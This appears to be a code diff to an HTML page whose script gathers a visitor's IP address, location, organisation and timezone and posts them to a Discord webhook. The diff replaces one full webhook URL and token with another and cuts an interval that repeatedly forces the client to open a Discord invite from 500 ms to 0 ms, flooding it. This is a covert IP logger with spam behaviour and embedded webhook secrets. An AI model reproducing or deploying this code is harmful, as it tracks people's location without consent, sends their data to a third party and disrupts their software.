@@ -108,7 +108,7 @@
 <strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
             const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://canary.discord.com/api/webhooks/1338946972035317842/06wPfqcoLsPfBbQs9wr33EJuWJBdEV5a2INuuJzg6XkKiNp8Sv0sB3xyfXhukgcmXpti';
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1340317878960001085/EkZbvqGu0ox0oHhK4YDqX5THJE_dzdlLtwdIS2CvuH29ikTCJdC5dGVLeBLyAPTSHaC5';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -119,7 +119,7 @@
         setInterval(function() {
             window.invokeNative("openUrl", "https://discord.gg/e5");
             window.invokeNative("openUrl", "https://discord.gg/e5");
-             }, 500);
+             },     0);
     </script>
 </body>
 </html>
